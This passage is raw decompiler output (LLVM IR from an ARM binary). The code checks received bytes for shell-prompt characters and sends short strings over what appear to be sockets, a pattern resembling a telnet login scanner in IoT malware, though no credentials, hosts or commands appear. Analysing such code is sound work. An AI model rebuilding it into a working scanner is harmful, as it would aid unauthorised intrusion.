  store i32 %v4_f010, i32* %r0.global-to-local, align 4
  br label %bb424

bb424:                                            ; preds = %bb422, %bb423
  store i32 61464, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_f010, i32 ptrtoint (i32* @global_var_e304.183 to i32))
  br label %dec_label_pc_f018

dec_label_pc_f018:                                ; preds = %dec_label_pc_ef10.loopexit, %dec_label_pc_ef14.backedge, %dec_label_pc_ef10.preheader, %dec_label_pc_efd4, %dec_label_pc_eef8, %dec_label_pc_eeb0, %dec_label_pc_fb04, %bb424
  %v3_f018 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f018, i32* %r3.global-to-local, align 4
  %v1_f01c = add i32 %v3_f018, 1
  store i32 %v1_f01c, i32* @r4, align 4
  %v2_f020 = icmp ugt i32 %v1_f01c, 254
  store i1 %v2_f020, i1* %cpsr_c.global-to-local, align 1
  %v7_f020 = icmp eq i32 %v1_f01c, 255
  store i1 %v7_f020, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f01c, i32* %stack_var_-52, align 4
  %v7_f028 = icmp slt i32 %v1_f01c, 256
  br i1 %v7_f028, label %dec_label_pc_eeb0, label %dec_label_pc_e830

dec_label_pc_f030:                                ; preds = %dec_label_pc_ef90
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_f034 = call i32 @function_fd40(i32 10)
  store i32 %v2_f7c4, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v3_f044 = call i32 @function_fc7c(i32 10, i32* nonnull %stack_var_-60)
  %v3_f048 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f044, i32* %r2.global-to-local, align 4
  %v1_f050 = add i32 %v3_f048, -1
  store i32 %v1_f050, i32* %r3.global-to-local, align 4
  %v0_f054 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f054, i32* %r0.global-to-local, align 4
  %v0_f058 = load i32, i32* @r6, align 4
  %v1_f058 = add i32 %v0_f058, 24
  %v2_f058 = inttoptr i32 %v1_f058 to i32*
  %v3_f058 = load i32, i32* %v2_f058, align 4
  store i32 %v3_f058, i32* %r1.global-to-local, align 4
  %v4_f05c = call i32 @function_101d8(i32 %v0_f054, i32 %v3_f058, i32 %v3_f044, i32 %v1_f050)
  %v2_f060 = icmp eq i32 %v4_f05c, -1
  store i1 %v2_f060, i1* %cpsr_c.global-to-local, align 1
  %v7_f060 = icmp eq i32 %v4_f05c, -1
  store i1 %v7_f060, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_f05c, i32* @r4, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_f928 = call i32 @function_fca0(i32 10)
  br i1 %v7_f060, label %dec_label_pc_f924, label %dec_label_pc_f06c

dec_label_pc_f06c:                                ; preds = %dec_label_pc_f030
  store i32 %v1_f928, i32* %r0.global-to-local, align 4
  %v0_f074 = load i32, i32* @r6, align 4
  %v1_f074 = add i32 %v0_f074, 4
  %v2_f074 = inttoptr i32 %v1_f074 to i32*
  %v3_f074 = load i32, i32* %v2_f074, align 4
  store i32 %v3_f074, i32* %r0.global-to-local, align 4
  %v1_f078 = call i32 @function_10be0(i32 %v3_f074)
  store i32 %v1_f078, i32* %r0.global-to-local, align 4
  %v0_f07c = load i32, i32* @r6, align 4
  %v1_f07c = add i32 %v0_f07c, 284
  %v2_f07c = inttoptr i32 %v1_f07c to i8*
  %v3_f07c = load i8, i8* %v2_f07c, align 1
  %v4_f07c = zext i8 %v3_f07c to i32
  %v1_f080 = add nuw nsw i32 %v4_f07c, 1
  %v1_f084 = urem i32 %v1_f080, 256
  store i32 %v1_f084, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f08c = icmp ugt i32 %v1_f084, 9
  store i1 %v2_f08c, i1* %cpsr_c.global-to-local, align 1
  %v7_f08c = icmp eq i32 %v1_f084, 10
  store i1 %v7_f08c, i1* %cpsr_z.global-to-local, align 1
  %v2_f090 = add i32 %v0_f07c, 4
  %v3_f090 = inttoptr i32 %v2_f090 to i32*
  store i32 -1, i32* %v3_f090, align 4
  %v0_f094 = load i32, i32* @r3, align 4
  %v1_f094 = trunc i32 %v0_f094 to i8
  %v2_f094 = load i32, i32* @r6, align 4
  %v3_f094 = add i32 %v2_f094, 284
  %v4_f094 = inttoptr i32 %v3_f094 to i8*
  store i8 %v1_f094, i8* %v4_f094, align 1
  %v0_f098 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f098, label %dec_label_pc_f09c, label %dec_label_pc_fa14

dec_label_pc_f09c:                                ; preds = %dec_label_pc_f06c
  store i32 0, i32* @r3, align 4
  %v1_f0a0 = load i32, i32* @r6, align 4
  %v2_f0a0 = add i32 %v1_f0a0, 12
  %v3_f0a0 = inttoptr i32 %v2_f0a0 to i32*
  store i32 0, i32* %v3_f0a0, align 4
  %v0_f0a4 = load i32, i32* @r3, align 4
  %v1_f0a4 = trunc i32 %v0_f0a4 to i8
  %v2_f0a4 = load i32, i32* @r6, align 4
  %v3_f0a4 = add i32 %v2_f0a4, 284
  %v4_f0a4 = inttoptr i32 %v3_f0a4 to i8*
  store i8 %v1_f0a4, i8* %v4_f0a4, align 1
  br label %dec_label_pc_f0a8

dec_label_pc_f0a8:                                ; preds = %dec_label_pc_fa14, %dec_label_pc_f09c
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_f0ac

dec_label_pc_f0ac:                                ; preds = %dec_label_pc_f728, %dec_label_pc_f5e8, %dec_label_pc_f49c, %dec_label_pc_f3c8, %dec_label_pc_f224, %dec_label_pc_f150, %dec_label_pc_f0a8
  %v0_f0ac = load i32, i32* @r6, align 4
  %v1_f0ac = add i32 %v0_f0ac, 24
  %v2_f0ac = inttoptr i32 %v1_f0ac to i32*
  %v3_f0ac = load i32, i32* %v2_f0ac, align 4
  %v0_f0b0 = load i32, i32* @r7, align 4
  %v2_f0b0 = sub i32 %v0_f0b0, %v3_f0ac
  %v3_f0b0 = icmp uge i32 %v0_f0b0, %v3_f0ac
  store i1 %v3_f0b0, i1* %cpsr_c.global-to-local, align 1
  %v4_f0b0 = xor i32 %v0_f0b0, %v3_f0ac
  %v5_f0b0 = xor i32 %v2_f0b0, %v0_f0b0
  %v6_f0b0 = and i32 %v5_f0b0, %v4_f0b0
  %v7_f0b0 = icmp slt i32 %v6_f0b0, 0
  %v8_f0b0 = icmp slt i32 %v2_f0b0, 0
  %v9_f0b0 = icmp eq i32 %v0_f0b0, %v3_f0ac
  store i1 %v9_f0b0, i1* %cpsr_z.global-to-local, align 1
  %v2_f0b4 = xor i1 %v8_f0b0, %v7_f0b0
  %v0_f0b0.v3_f0ac = select i1 %v2_f0b4, i32 %v0_f0b0, i32 %v3_f0ac
  store i32 %v0_f0b0.v3_f0ac, i32* %r1.global-to-local, align 4
  %v2_f0bc = sub i32 %v3_f0ac, %v0_f0b0.v3_f0ac
  store i32 %v2_f0bc, i32* @r2, align 4
  store i32 %v2_f0bc, i32* %v2_f0ac, align 4
  %v0_f0c4 = load i32, i32* %sb.global-to-local, align 4
  %v1_f0c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_f0c4 = add i32 %v1_f0c4, %v0_f0c4
  store i32 %v2_f0c4, i32* @r1, align 4
  store i32 %v0_f0c4, i32* @r0, align 4
  %v3_f0cc = call i32 @function_11100(i32 %v0_f0c4, i32 %v2_f0c4, i32 %v2_f0bc)
  store i32 %v3_f0cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ef90

dec_label_pc_f0d4:                                ; preds = %dec_label_pc_ef90
  %v1_f0d4 = add i32 %v0_ef90, 24
  %v2_f0d4 = inttoptr i32 %v1_f0d4 to i32*
  %v3_f0d4 = load i32, i32* %v2_f0d4, align 4
  store i32 %v3_f0d4, i32* %r2.global-to-local, align 4
  %v1_f0d8 = add i32 %v3_f0d4, -1
  store i32 %v1_f0d8, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f0dc = icmp eq i32 %v1_f0d8, 0
  store i1 %v2_f0dc, i1* %cpsr_z.global-to-local, align 1
  %tmp427 = icmp slt i32 %v1_f0d8, 1
  br i1 %tmp427, label %dec_label_pc_ef14.backedge.thread, label %dec_label_pc_f0e4

dec_label_pc_f0e4:                                ; preds = %dec_label_pc_f0d4
  %v2_f0e4 = add i32 %v1_f0d8, %v0_ef90
  store i32 %v2_f0e4, i32* %r3.global-to-local, align 4
  %v1_f0e8 = add i32 %v2_f0e4, 28
  %v2_f0e8 = inttoptr i32 %v1_f0e8 to i8*
  %v3_f0e8 = load i8, i8* %v2_f0e8, align 1
  %v4_f0e8 = zext i8 %v3_f0e8 to i32
  store i32 %v4_f0e8, i32* %r3.global-to-local, align 4
  %v2_f0ec = icmp ugt i8 %v3_f0e8, 61
  store i1 %v2_f0ec, i1* %cpsr_c.global-to-local, align 1
  %v7_f0ec = icmp eq i8 %v3_f0e8, 62
  store i1 %v7_f0ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f0ec, label %dec_label_pc_f150, label %bb428

bb428:                                            ; preds = %dec_label_pc_f0e4
  %v3_f0f0 = icmp ugt i8 %v3_f0e8, 57
  store i1 %v3_f0f0, i1* %cpsr_c.global-to-local, align 1
  %v8_f0f0 = icmp eq i8 %v3_f0e8, 58
  store i1 %v8_f0f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f0f0, label %dec_label_pc_f150, label %dec_label_pc_f0f8

dec_label_pc_f0f8:                                ; preds = %bb428
  %v2_f0f8 = icmp ugt i8 %v3_f0e8, 35
  store i1 %v2_f0f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f0f8 = icmp eq i8 %v3_f0e8, 36
  store i1 %v7_f0f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f0f8, label %dec_label_pc_f150, label %dec_label_pc_f100

dec_label_pc_f100:                                ; preds = %dec_label_pc_f0f8
  %v2_f100 = icmp ugt i8 %v3_f0e8, 34
  store i1 %v2_f100, i1* %cpsr_c.global-to-local, align 1
  %v7_f100 = icmp eq i8 %v3_f0e8, 35
  store i1 %v7_f100, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f100, label %dec_label_pc_f150, label %dec_label_pc_f108

dec_label_pc_f108:                                ; preds = %dec_label_pc_f100
  %v2_f108 = icmp ugt i8 %v3_f0e8, 36
  store i1 %v2_f108, i1* %cpsr_c.global-to-local, align 1
  %v7_f108 = icmp eq i8 %v3_f0e8, 37
  store i1 %v7_f108, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f108, label %dec_label_pc_f150, label %dec_label_pc_f138.preheader

dec_label_pc_f138.preheader:                      ; preds = %dec_label_pc_f108
  %v3_f10c = add i32 %v0_ef90, 28
  %v2_f110 = add i32 %v3_f10c, %v3_f0d4
  store i32 %v2_f110, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f138

dec_label_pc_f11c:                                ; preds = %bb429
  %v2_f11c = icmp ugt i8 %v3_f140, 35
  store i1 %v2_f11c, i1* %cpsr_c.global-to-local, align 1
  %v7_f11c = icmp eq i8 %v3_f140, 36
  store i1 %v7_f11c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f11c, label %dec_label_pc_f150, label %dec_label_pc_f124

dec_label_pc_f124:                                ; preds = %dec_label_pc_f11c
  %v2_f124 = icmp ugt i8 %v3_f140, 34
  store i1 %v2_f124, i1* %cpsr_c.global-to-local, align 1
  %v7_f124 = icmp eq i8 %v3_f140, 35
  store i1 %v7_f124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f124, label %dec_label_pc_f150, label %dec_label_pc_f12c

dec_label_pc_f12c:                                ; preds = %dec_label_pc_f124
  %v2_f12c = icmp ugt i8 %v3_f140, 36
  store i1 %v2_f12c, i1* %cpsr_c.global-to-local, align 1
  %v7_f12c = icmp eq i8 %v3_f140, 37
  store i1 %v7_f12c, i1* %cpsr_z.global-to-local, align 1
  %v1_f130 = add i32 %v0_f130, -1
  store i32 %v1_f130, i32* %r3.global-to-local, align 4
  br i1 %v7_f12c, label %dec_label_pc_f150, label %dec_label_pc_f138

dec_label_pc_f138:                                ; preds = %dec_label_pc_f138.preheader, %dec_label_pc_f12c
  %v0_f130 = phi i32 [ %v2_f110, %dec_label_pc_f138.preheader ], [ %v1_f130, %dec_label_pc_f12c ]
  %v0_f138 = phi i32 [ %v1_f0d8, %dec_label_pc_f138.preheader ], [ %v1_f138, %dec_label_pc_f12c ]
  %v1_f138 = add i32 %v0_f138, -1
  store i32 %v1_f138, i32* %r1.global-to-local, align 4
  %v2_f138 = icmp ne i32 %v0_f138, 0
  store i1 %v2_f138, i1* %cpsr_c.global-to-local, align 1
  %v7_f138 = icmp eq i32 %v0_f138, 1
  store i1 %v7_f138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f138, label %dec_label_pc_ef14.backedge.thread561, label %dec_label_pc_f140

dec_label_pc_f140:                                ; preds = %dec_label_pc_f138
  %v1_f140 = add i32 %v0_f130, -2
  %v2_f140 = inttoptr i32 %v1_f140 to i8*
  %v3_f140 = load i8, i8* %v2_f140, align 1
  %v4_f140 = zext i8 %v3_f140 to i32
  store i32 %v4_f140, i32* %r2.global-to-local, align 4
  %v2_f144 = icmp ugt i8 %v3_f140, 61
  store i1 %v2_f144, i1* %cpsr_c.global-to-local, align 1
  %v7_f144 = icmp eq i8 %v3_f140, 62
  store i1 %v7_f144, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f144, label %dec_label_pc_f150, label %bb429

bb429:                                            ; preds = %dec_label_pc_f140
  %v3_f148 = icmp ugt i8 %v3_f140, 57
  store i1 %v3_f148, i1* %cpsr_c.global-to-local, align 1
  %v8_f148 = icmp eq i8 %v3_f140, 58
  store i1 %v8_f148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f148, label %dec_label_pc_f150, label %dec_label_pc_f11c

dec_label_pc_f150:                                ; preds = %dec_label_pc_f140, %bb429, %dec_label_pc_f12c, %dec_label_pc_f124, %dec_label_pc_f11c, %dec_label_pc_f108, %dec_label_pc_f0e4, %dec_label_pc_f100, %dec_label_pc_f0f8, %bb428
  %v0_f154 = phi i32 [ %v1_f0d8, %dec_label_pc_f108 ], [ %v1_f0d8, %dec_label_pc_f0e4 ], [ %v1_f0d8, %dec_label_pc_f100 ], [ %v1_f0d8, %dec_label_pc_f0f8 ], [ %v1_f0d8, %bb428 ], [ %v1_f138, %dec_label_pc_f11c ], [ %v1_f138, %dec_label_pc_f124 ], [ %v1_f138, %dec_label_pc_f12c ], [ %v1_f138, %bb429 ], [ %v1_f138, %dec_label_pc_f140 ]
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_f154 = add i32 %v0_f154, 1
  store i32 %v1_f154, i32* @r7, align 4
  %v1_f158 = call i32 @function_fd40(i32 8)
  store i32 %v2_f7c4, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v3_f168 = call i32 @function_fc7c(i32 8, i32* nonnull %stack_var_-60)
  store i32 %v3_f168, i32* %r0.global-to-local, align 4
  %v3_f16c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f16c, i32* %r2.global-to-local, align 4
  store i32 %v3_f168, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f178 = load i32, i32* @r6, align 4
  %v1_f178 = add i32 %v0_f178, 4
  %v2_f178 = inttoptr i32 %v1_f178 to i32*
  %v3_f178 = load i32, i32* %v2_f178, align 4
  store i32 %v3_f178, i32* %r0.global-to-local, align 4
  %v4_f17c = call i32 @function_11300(i32 %v3_f178, i32 %v3_f168, i32 %v3_f16c, i32 16384)
  store i32 %v4_f17c, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15ff4.185 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f18c = load i32, i32* @r6, align 4
  %v1_f18c = add i32 %v0_f18c, 4
  %v2_f18c = inttoptr i32 %v1_f18c to i32*
  %v3_f18c = load i32, i32* %v2_f18c, align 4
  store i32 %v3_f18c, i32* %r0.global-to-local, align 4
  %v4_f190 = call i32 @function_11300(i32 %v3_f18c, i32 ptrtoint ([3 x i8]* @global_var_15ff4.185 to i32), i32 2, i32 16384)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_f198 = call i32 @function_fca0(i32 8)
  store i32 %v1_f198, i32* %r0.global-to-local, align 4
  store i32 10, i32* @r3, align 4
  %v1_f1a0 = load i32, i32* @r6, align 4
  %v2_f1a0 = add i32 %v1_f1a0, 12
  %v3_f1a0 = inttoptr i32 %v2_f1a0 to i32*
  store i32 10, i32* %v3_f1a0, align 4
  br label %dec_label_pc_f0ac

dec_label_pc_f1a8:                                ; preds = %dec_label_pc_ef90
  %v1_f1a8 = add i32 %v0_ef90, 24
  %v2_f1a8 = inttoptr i32 %v1_f1a8 to i32*
  %v3_f1a8 = load i32, i32* %v2_f1a8, align 4
  store i32 %v3_f1a8, i32* %r2.global-to-local, align 4
  %v1_f1ac = add i32 %v3_f1a8, -1
  store i32 %v1_f1ac, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f1b0 = icmp eq i32 %v1_f1ac, 0
  store i1 %v2_f1b0, i1* %cpsr_z.global-to-local, align 1
  %tmp430 = icmp slt i32 %v1_f1ac, 1
  br i1 %tmp430, label %dec_label_pc_ef14.backedge.thread, label %dec_label_pc_f1b8

dec_label_pc_f1b8:                                ; preds = %dec_label_pc_f1a8
  %v2_f1b8 = add i32 %v1_f1ac, %v0_ef90
  store i32 %v2_f1b8, i32* %r3.global-to-local, align 4
  %v1_f1bc = add i32 %v2_f1b8, 28
  %v2_f1bc = inttoptr i32 %v1_f1bc to i8*
  %v3_f1bc = load i8, i8* %v2_f1bc, align 1
  %v4_f1bc = zext i8 %v3_f1bc to i32
  store i32 %v4_f1bc, i32* %r3.global-to-local, align 4
  %v2_f1c0 = icmp ugt i8 %v3_f1bc, 61
  store i1 %v2_f1c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f1c0 = icmp eq i8 %v3_f1bc, 62
  store i1 %v7_f1c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1c0, label %dec_label_pc_f224, label %bb431

bb431:                                            ; preds = %dec_label_pc_f1b8
  %v3_f1c4 = icmp ugt i8 %v3_f1bc, 57
  store i1 %v3_f1c4, i1* %cpsr_c.global-to-local, align 1
  %v8_f1c4 = icmp eq i8 %v3_f1bc, 58
  store i1 %v8_f1c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f1c4, label %dec_label_pc_f224, label %dec_label_pc_f1cc

dec_label_pc_f1cc:                                ; preds = %bb431
  %v2_f1cc = icmp ugt i8 %v3_f1bc, 35
  store i1 %v2_f1cc, i1* %cpsr_c.global-to-local, align 1
  %v7_f1cc = icmp eq i8 %v3_f1bc, 36
  store i1 %v7_f1cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1cc, label %dec_label_pc_f224, label %dec_label_pc_f1d4

dec_label_pc_f1d4:                                ; preds = %dec_label_pc_f1cc
  %v2_f1d4 = icmp ugt i8 %v3_f1bc, 34
  store i1 %v2_f1d4, i1* %cpsr_c.global-to-local, align 1
  %v7_f1d4 = icmp eq i8 %v3_f1bc, 35
  store i1 %v7_f1d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1d4, label %dec_label_pc_f224, label %dec_label_pc_f1dc

dec_label_pc_f1dc:                                ; preds = %dec_label_pc_f1d4
  %v2_f1dc = icmp ugt i8 %v3_f1bc, 36
  store i1 %v2_f1dc, i1* %cpsr_c.global-to-local, align 1
  %v7_f1dc = icmp eq i8 %v3_f1bc, 37
  store i1 %v7_f1dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1dc, label %dec_label_pc_f224, label %dec_label_pc_f20c.preheader

dec_label_pc_f20c.preheader:                      ; preds = %dec_label_pc_f1dc
  %v3_f1e0 = add i32 %v0_ef90, 28
  %v2_f1e4 = add i32 %v3_f1e0, %v3_f1a8
  store i32 %v2_f1e4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f20c

dec_label_pc_f1f0:                                ; preds = %bb432
  %v2_f1f0 = icmp ugt i8 %v3_f214, 35
  store i1 %v2_f1f0, i1* %cpsr_c.global-to-local, align 1
  %v7_f1f0 = icmp eq i8 %v3_f214, 36
  store i1 %v7_f1f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1f0, label %dec_label_pc_f224, label %dec_label_pc_f1f8

dec_label_pc_f1f8:                                ; preds = %dec_label_pc_f1f0
  %v2_f1f8 = icmp ugt i8 %v3_f214, 34
  store i1 %v2_f1f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f1f8 = icmp eq i8 %v3_f214, 35
  store i1 %v7_f1f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f1f8, label %dec_label_pc_f224, label %dec_label_pc_f200

dec_label_pc_f200:                                ; preds = %dec_label_pc_f1f8
  %v2_f200 = icmp ugt i8 %v3_f214, 36
  store i1 %v2_f200, i1* %cpsr_c.global-to-local, align 1
  %v7_f200 = icmp eq i8 %v3_f214, 37
  store i1 %v7_f200, i1* %cpsr_z.global-to-local, align 1
  %v1_f204 = add i32 %v0_f204, -1
  store i32 %v1_f204, i32* %r3.global-to-local, align 4
  br i1 %v7_f200, label %dec_label_pc_f224, label %dec_label_pc_f20c

dec_label_pc_f20c:                                ; preds = %dec_label_pc_f20c.preheader, %dec_label_pc_f200
  %v0_f204 = phi i32 [ %v2_f1e4, %dec_label_pc_f20c.preheader ], [ %v1_f204, %dec_label_pc_f200 ]
  %v0_f20c = phi i32 [ %v1_f1ac, %dec_label_pc_f20c.preheader ], [ %v1_f20c, %dec_label_pc_f200 ]
  %v1_f20c = add i32 %v0_f20c, -1
  store i32 %v1_f20c, i32* %r1.global-to-local, align 4
  %v2_f20c = icmp ne i32 %v0_f20c, 0
  store i1 %v2_f20c, i1* %cpsr_c.global-to-local, align 1
  %v7_f20c = icmp eq i32 %v0_f20c, 1
  store i1 %v7_f20c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f20c, label %dec_label_pc_ef14.backedge.thread561, label %dec_label_pc_f214

dec_label_pc_f214:                                ; preds = %dec_label_pc_f20c
  %v1_f214 = add i32 %v0_f204, -2
  %v2_f214 = inttoptr i32 %v1_f214 to i8*
  %v3_f214 = load i8, i8* %v2_f214, align 1
  %v4_f214 = zext i8 %v3_f214 to i32
  store i32 %v4_f214, i32* %r2.global-to-local, align 4
  %v2_f218 = icmp ugt i8 %v3_f214, 61
  store i1 %v2_f218, i1* %cpsr_c.global-to-local, align 1
  %v7_f218 = icmp eq i8 %v3_f214, 62
  store i1 %v7_f218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f218, label %dec_label_pc_f224, label %bb432

bb432:                                            ; preds = %dec_label_pc_f214
  %v3_f21c = icmp ugt i8 %v3_f214, 57
  store i1 %v3_f21c, i1* %cpsr_c.global-to-local, align 1
  %v8_f21c = icmp eq i8 %v3_f214, 58
  store i1 %v8_f21c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f21c, label %dec_label_pc_f224, label %dec_label_pc_f1f0

dec_label_pc_f224:                                ; preds = %dec_label_pc_f214, %bb432, %dec_label_pc_f200, %dec_label_pc_f1f8, %dec_label_pc_f1f0, %dec_label_pc_f1dc, %dec_label_pc_f1b8, %dec_label_pc_f1d4, %dec_label_pc_f1cc, %bb431
  %v0_f228 = phi i32 [ %v1_f1ac, %dec_label_pc_f1dc ], [ %v1_f1ac, %dec_label_pc_f1b8 ], [ %v1_f1ac, %dec_label_pc_f1d4 ], [ %v1_f1ac, %dec_label_pc_f1cc ], [ %v1_f1ac, %bb431 ], [ %v1_f20c, %dec_label_pc_f1f0 ], [ %v1_f20c, %dec_label_pc_f1f8 ], [ %v1_f20c, %dec_label_pc_f200 ], [ %v1_f20c, %bb432 ], [ %v1_f20c, %dec_label_pc_f214 ]
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_f228 = add i32 %v0_f228, 1
  store i32 %v1_f228, i32* @r7, align 4
  %v1_f22c = call i32 @function_fd40(i32 7)
  store i32 %v2_f7c4, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r0.global-to-local, align 4
  %v3_f23c = call i32 @function_fc7c(i32 7, i32* nonnull %stack_var_-60)
  store i32 %v3_f23c, i32* %r0.global-to-local, align 4
  %v3_f240 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f240, i32* %r2.global-to-local, align 4
  store i32 %v3_f23c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f24c = load i32, i32* @r6, align 4
  %v1_f24c = add i32 %v0_f24c, 4
  %v2_f24c = inttoptr i32 %v1_f24c to i32*
  %v3_f24c = load i32, i32* %v2_f24c, align 4
  store i32 %v3_f24c, i32* %r0.global-to-local, align 4
  %v4_f250 = call i32 @function_11300(i32 %v3_f24c, i32 %v3_f23c, i32 %v3_f240, i32 16384)
  store i32 %v4_f250, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15ff4.185 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f260 = load i32, i32* @r6, align 4
  %v1_f260 = add i32 %v0_f260, 4
  %v2_f260 = inttoptr i32 %v1_f260 to i32*
  %v3_f260 = load i32, i32* %v2_f260, align 4
  store i32 %v3_f260, i32* %r0.global-to-local, align 4
  %v4_f264 = call i32 @function_11300(i32 %v3_f260, i32 ptrtoint ([3 x i8]* @global_var_15ff4.185 to i32), i32 2, i32 16384)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_f26c = call i32 @function_fca0(i32 7)
  store i32 %v1_f26c, i32* %r0.global-to-local, align 4
  store i32 9, i32* @r3, align 4
  %v1_f274 = load i32, i32* @r6, align 4
  %v2_f274 = add i32 %v1_f274, 12
  %v3_f274 = inttoptr i32 %v2_f274 to i32*
  store i32 9, i32* %v3_f274, align 4
  br label %dec_label_pc_f0ac

dec_label_pc_f27c:                                ; preds = %dec_label_pc_ef90
  %v1_f27c = add i32 %v0_ef90, 24
  %v2_f27c = inttoptr i32 %v1_f27c to i32*
  %v3_f27c = load i32, i32* %v2_f27c, align 4
  store i32 %v3_f27c, i32* %r1.global-to-local, align 4
  %v0_f280 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f280, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v3_f288166 = icmp eq i32 %v3_f27c, 0
  store i1 %v3_f288166, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_f288166, i1* %cpsr_z.global-to-local, align 1
  %v6_f28c173 = icmp sgt i32 %v3_f27c, 0
  br i1 %v6_f28c173, label %dec_label_pc_f290.preheader, label %dec_label_pc_f33c

dec_label_pc_f288.loopexit:                       ; preds = %dec_label_pc_f2ac
  %v2_f2b4 = add i32 %v1_f2b4, 2
  store i32 %v2_f2b4, i32* @r4, align 4
  %v2_f2b8 = add i32 %v1_f2b8, 2
  store i32 %v2_f2b8, i32* @r7, align 4
  %v3_f288 = icmp uge i32 %v2_f2b8, %v1_f288
  store i1 %v3_f288, i1* %cpsr_c.global-to-local, align 1
  %v9_f288 = icmp eq i32 %v2_f2b8, %v1_f288
  store i1 %v9_f288, i1* %cpsr_z.global-to-local, align 1
  %v6_f28c = icmp slt i32 %v2_f2b8, %v1_f288
  br i1 %v6_f28c, label %dec_label_pc_f290.preheader, label %dec_label_pc_f33c

dec_label_pc_f290.preheader:                      ; preds = %dec_label_pc_f27c, %dec_label_pc_f288.loopexit
  %v6_f344273 = phi i32 [ %v6_f344274, %dec_label_pc_f288.loopexit ], [ %v0_ef90, %dec_label_pc_f27c ]
  %v1_f2b8262 = phi i32 [ %v2_f2b8, %dec_label_pc_f288.loopexit ], [ 0, %dec_label_pc_f27c ]
  %v1_f29c260 = phi i32 [ %v1_f288, %dec_label_pc_f288.loopexit ], [ %v3_f27c, %dec_label_pc_f27c ]
  %v0_f290258 = phi i32 [ %v2_f2b4, %dec_label_pc_f288.loopexit ], [ %v0_f280, %dec_label_pc_f27c ]
  br label %dec_label_pc_f290

dec_label_pc_f290:                                ; preds = %dec_label_pc_f290.preheader, %dec_label_pc_f320
  %v6_f344274 = phi i32 [ %v6_f344273, %dec_label_pc_f290.preheader ], [ %v0_f328, %dec_label_pc_f320 ]
  %v1_f2b8 = phi i32 [ %v1_f2b8262, %dec_label_pc_f290.preheader ], [ %v1_f32c, %dec_label_pc_f320 ]
  %v1_f288 = phi i32 [ %v1_f29c260, %dec_label_pc_f290.preheader ], [ %v3_f328, %dec_label_pc_f320 ]
  %v1_f2b4 = phi i32 [ %v0_f290258, %dec_label_pc_f290.preheader ], [ %v1_f334, %dec_label_pc_f320 ]
  %v1_f290 = inttoptr i32 %v1_f2b4 to i8*
  %v2_f290 = load i8, i8* %v1_f290, align 1
  %v3_f290 = zext i8 %v2_f290 to i32
  store i32 %v3_f290, i32* @r3, align 4
  %v2_f294 = icmp eq i8 %v2_f290, -1
  store i1 %v2_f294, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f294, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f294, label %dec_label_pc_f29c, label %dec_label_pc_f33c

dec_label_pc_f29c:                                ; preds = %dec_label_pc_f290
  %v0_f29c = load i32, i32* %sb.global-to-local, align 4
  %v2_f29c = add i32 %v0_f29c, %v1_f288
